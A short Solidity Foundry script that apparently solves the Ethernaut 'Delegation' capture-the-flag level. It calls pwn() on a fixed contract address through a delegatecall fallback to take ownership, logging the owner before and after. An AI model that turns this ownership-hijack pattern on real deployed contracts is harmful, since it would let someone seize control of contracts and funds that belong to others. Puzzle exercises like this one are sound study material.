// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";

interface IDelegation {
    function owner() external view returns (address);

    function pwn() external;
}

contract PoC is Script {
    IDelegation badIdea =
        IDelegation(0xb59aCD7131cE6c4CbAAF32e8A06Da14f65C09268);

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        console2.log("Current owner: ", badIdea.owner());
        (bool success, ) = address(badIdea).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Hack failed");
        console2.log("New owner: ", badIdea.owner());

        vm.stopBroadcast();
    }
}
